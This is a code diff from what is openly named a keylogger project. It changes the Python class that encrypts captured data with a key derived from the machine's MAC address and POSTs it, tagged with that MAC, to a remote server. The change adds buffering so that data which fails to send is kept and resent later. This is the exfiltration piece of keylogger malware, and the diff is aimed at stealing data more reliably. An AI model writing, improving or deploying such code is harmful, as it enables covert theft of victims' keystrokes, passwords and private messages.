@@ -4,21 +4,27 @@ import requests
 from getmac import get_mac_address
 
 from KEYLOGGER_PROJECT.Encrypt_Decrypt.encrypt_file import Encrypt
+from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt
 
 
 class NetworkWrite:
     def __init__(self, server_link):
         self.__server_link = server_link
         self.__mac = get_mac_address()
+        self.__left_data = ''
+        self.__key = Encrypt.create_key(self.__mac)
 
 
     def write_to_server(self, data):
+        res_status = ''
         try:
-            key = Encrypt.create_key(self.__mac)
-            data = Encrypt.encrypt_data(data, key)
+            data = Encrypt.encrypt_data(self.__left_data + str(data), self.__key)
             send_data = {'data': str(data), 'mac': self.__mac}
-            res=requests.post(self.__server_link, json=send_data)
-            print(res)
-            print('status: ',res.status_code)
-        except Exception as e:
-            print(e)
+            res = requests.post(self.__server_link, json=send_data)
+            res_status = res.status_code
+            print('status: ', res.status_code)
+            self.__left_data = ''
+        except:
+            if res_status != 200:
+                self.__left_data += Decrypt.decrypt_data(data, self.__key)
+                print('innnn')
